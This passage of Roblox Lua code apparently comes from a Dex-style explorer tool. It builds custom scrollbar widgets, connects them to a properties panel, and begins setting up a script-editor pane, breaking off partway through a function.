			Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
			Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
				Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
					BackgroundColor3 = ScrollStyles.Button;
					BorderColor3 = ScrollStyles.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = ScrollStyles.Border;
		})
		local graphicSize = ScrollBarWidth/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = ScrollBarWidth*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
				if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(1, -1 * ScrollBarWidth, 1, 0)
MainFrame.Position = UDim2.new(0, 0, 0, 0)
MainFrame.BackgroundTransparency = 1
MainFrame.ClipsDescendants = true
MainFrame.Parent = PropertiesFrame

ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, 0, 0, 0)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 1
Create(scrollBar.GUI,{
	Position = UDim2.new(1,-ScrollBarWidth,0,0);
	Size = UDim2.new(0,ScrollBarWidth,1,0);
	Parent = PropertiesFrame;
})

scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = ScrollBarWidth
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,-ScrollBarWidth);
	Size = UDim2.new(1,-ScrollBarWidth,0,ScrollBarWidth);
	Visible = false;
	Parent = PropertiesFrame;
})

do
	local listEntries = {}
	local nameConnLookup = {}
	
	function scrollBar.UpdateCallback(self)
		scrollBar.TotalSpace = ContentFrame.AbsoluteSize.Y
		scrollBar.VisibleSpace = MainFrame.AbsoluteSize.Y
		ContentFrame.Position = UDim2.new(ContentFrame.Position.X.Scale,ContentFrame.Position.X.Offset,0,-1*scrollBar.ScrollIndex)
	end

	function scrollBarH.UpdateCallback(self)
		
	end

	MainFrame.Changed:connect(function(p)
		if p == 'AbsoluteSize' then
			scrollBarH.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.x)
			scrollBarH:Update()
			scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
			scrollBar:Update()
		end
	end)

	local wheelAmount = Row.Height
	PropertiesFrame.MouseWheelForward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
		end
	end)
	PropertiesFrame.MouseWheelBackward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
		end
	end)
end

scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
scrollBar:Update()

showProperties(GetSelection())

bindSelectionChanged.Event:connect(function()
	showProperties(GetSelection())
end)

bindSetAwait.Event:connect(function(obj)
	if AwaitingObjectValue then
		AwaitingObjectValue = false
		local mySel = obj
		if mySel then
			pcall(function()
				Set(AwaitingObjectObj, AwaitingObjectProp, mySel)
			end)
		end
	end
end)

propertiesSearch.Changed:connect(function(prop)
	if prop == "Text" then
		showProperties(GetSelection())
	end
end)

bindGetApi.OnInvoke = function()
	return RbxApi
end

bindGetAwait.OnInvoke = function()
	return AwaitingObjectValue
end
end)
spawn(function()
	local top = D_E_X.ScriptEditor

local editorGrid = top:WaitForChild("EditorGrid")

local currentSource = ""

local currentEditor = {
	x = 0,
	y = 0
}

local userInput = game:GetService("UserInputService")
local mouse = game.Players.LocalPlayer:GetMouse()

local topBar = top:WaitForChild("TopBar")
local scriptBar = topBar:WaitForChild("ScriptBar")
local scriptBarLeft = topBar:WaitForChild("ScriptBarLeft")
local scriptBarRight = topBar:WaitForChild("ScriptBarRight")
local clipboardButton = topBar:WaitForChild("Clipboard")

local entryTemplate = topBar:WaitForChild("Entry")

local openEvent = top:WaitForChild("OpenScript")

local closeButton = top:WaitForChild("Close")

local memoryScripts = {}

local editingIndex = 0

-- Scrollbar

local ScrollBarWidth = 16

local ScrollStyles = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 63/255, 119/255, 189/255);
	BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}
do
	local ZIndexLock = {}
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end
end
function SetZIndexOnChanged(object)
	return object.Changed:connect(function(p)
		if p == "ZIndex" then
			SetZIndex(object,object.ZIndex)
		end
	end)
end
function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end
-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end
-- AutoButtonColor doesn't always reset properly
function ResetButtonColor(button)
	local active = button.Active
	button.Active = not active
	button.Active = active
end

function ArrowGraphic(size,dir,scaled,template)
	local Frame = Create('Frame',{
		Name = "Arrow Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size,0,size);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	local transform
	if dir == nil or dir == 'Up' then
		function transform(p,s) return p,s end
	elseif dir == 'Down' then
		function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
	elseif dir == 'Left' then
		function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	elseif dir == 'Right' then
		function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	end

	local scale
	if scaled then
		function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
	else
		function scale(p,s) return p,s end
	end

	local o = math.floor(size/4)
	if size%2 == 0 then
		local n = size/2-1
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,(i+1)*2,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	else
		local n = (size-1)/2
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,i*2+1,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	end
	if size%4 > 1 then
		local t = template:Clone()
		local p,s = scale(transform(
			UDim2.new(0,0,0,size-o-1),
			UDim2.new(0,size,0,1)
		))
		t.Position = p
		t.Size = s
		t.Parent = Frame
	end
	return Frame
end

function GripGraphic(size,dir,spacing,scaled,template)
	local Frame = Create('Frame',{
		Name = "Grip Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size.x,0,size.y);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	spacing = spacing or 2

	local scale
	if scaled then
		function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
	else
		function scale(p) return p end
	end

	if dir == 'Vertical' then
		for i=0,size.x-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,1,0,size.y))
			t.Position = scale(UDim2.new(0,i,0,0))
			t.Parent = Frame
		end
	elseif dir == nil or dir == 'Horizontal' then
		for i=0,size.y-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,size.x,0,1))
			t.Position = scale(UDim2.new(0,0,0,i))
			t.Parent = Frame
		end
	end

	return Frame
end

do
	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
			Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
				Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
					BackgroundColor3 = ScrollStyles.Button;
					BorderColor3 = ScrollStyles.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = ScrollStyles.Border;
		})
		local graphicSize = ScrollBarWidth/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = ScrollBarWidth*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
				if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
